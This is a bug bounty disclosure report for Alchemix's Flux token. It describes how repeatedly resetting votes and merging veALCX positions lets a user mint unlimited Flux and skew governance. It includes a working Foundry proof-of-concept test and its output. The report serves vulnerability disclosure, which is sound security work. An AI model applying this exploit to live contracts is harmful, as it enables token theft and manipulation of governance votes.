# 30825 - \[SC - Critical] Users can get unlimited amounts of Flux tokens

Submitted on May 6th 2024 at 21:36:36 UTC by @imsrybr0 for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #30825

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/FluxToken.sol>

Impacts:

* Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results

## Description

## Brief/Intro

Users can get unlimited amounts of Flux tokens.

## Vulnerability Details

```solidity
// ...
contract VotingEscrow is IERC721, IERC721Metadata, IVotes, IVotingEscrow {
    // ...
    function merge(uint256 _from, uint256 _to) external {
        require(!voted[_from], "voting in progress for token");
        // ...
        IFluxToken(FLUX).mergeFlux(_from, _to);
        // ...
    }
    // ...
}
```

```solidity
// ...
contract FluxToken is ERC20("Flux", "FLUX"), IFluxToken {
    // ...
    function mergeFlux(uint256 _fromTokenId, uint256 _toTokenId) external {
        require(msg.sender == veALCX, "not veALCX");

        unclaimedFlux[_toTokenId] += unclaimedFlux[_fromTokenId];
        unclaimedFlux[_fromTokenId] = 0;
    }
    // ...
}
```

```solidity
// ...
contract Voter is IVoter {
    // ...
    function reset(uint256 _tokenId) public onlyNewEpoch(_tokenId) {
        if (msg.sender != admin) {
            require(IVotingEscrow(veALCX).isApprovedOrOwner(msg.sender, _tokenId), "not approved or owner");
        }

        lastVoted[_tokenId] = block.timestamp;
        _reset(_tokenId);
        IVotingEscrow(veALCX).abstain(_tokenId);
        IFluxToken(FLUX).accrueFlux(_tokenId);
    }
    // ...
}
```

* The `VotingEscrow@merge` function only checks if the token being merged voted `yes`. It also merges the unclaimed Flux earnings of the merge tokens.
* The `Voter@reset` function :
  * Doesn't check if the given token id has any votes to reset before doing so.
  * Votes `no` on the `VotingEscrow`
  * Accrues Flux earning for the given token id

Under those conditions, a user can :

1. Start by locking an amount of tokens in `VotingEscrow` and get `Token ID N` in return
2. Call `Voter@reset` for `Token ID N` to accrue Flux earning for that token.
3. Lock a dust amount of tokens in `VotingEscrow` and get `Token ID M` in return
4. Call `VotingEscrow@merge` to merge `Token ID N` into `Token ID M` which will add the first token unclaimed Flux earning to the second one.

Steps 2), 3) and 4) can be repeated as needed carrying over unclaimed Flux earnings from the previous token to the next one and accruing them again.

## Impact Details

* Artificially boost voting power for gauges voting.
* Claim Flux ERC20 tokens to :
  * Sell them
  * Use them to ragequit for free

## References

* <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol#L618-L651>
* <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol#L183-L192>
* <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/FluxToken.sol#L180-L185>

## Proof of Concept

```solidity
    function testMergeFlux() public {
        uint256 previousTokenId = createVeAlcx(admin, TOKEN_1, MAXTIME, true);
        console2.log("Starting Unclaimed Flux", flux.unclaimedFlux(previousTokenId));

        uint256 nextTokenId;

        vm.startPrank(admin);
        voter.reset(previousTokenId);

        console2.log("Unclaimed Flux after reset", flux.unclaimedFlux(previousTokenId));

        for (uint256 i; i < 10; i++) {
            nextTokenId = createVeAlcx(admin, 1, MAXTIME, true);

            veALCX.merge(previousTokenId, nextTokenId);

            voter.reset(nextTokenId);

            previousTokenId = nextTokenId;
        }

        console2.log("Unclaimed Flux after 10 iterations", flux.unclaimedFlux(nextTokenId));

        flux.claimFlux(nextTokenId, flux.unclaimedFlux(nextTokenId));

        console2.log("Flux ERC20 balance", flux.balanceOf(admin));
    }
```

## Results

```console
[⠒] Compiling...
Ran 1 test for src/test/VotingEscrow.t.sol:VotingEscrowTest
[PASS] testMergeFlux() (gas: 9703837)
Logs:
  Starting Unclaimed Flux 0
  Unclaimed Flux after reset 984526667926843455
  Unclaimed Flux after 10 iterations 10829793347195278005
  Flux ERC20 balance 10829793347195278005

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 32.92s (24.57s CPU time)

Ran 1 test suite in 34.78s (32.92s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
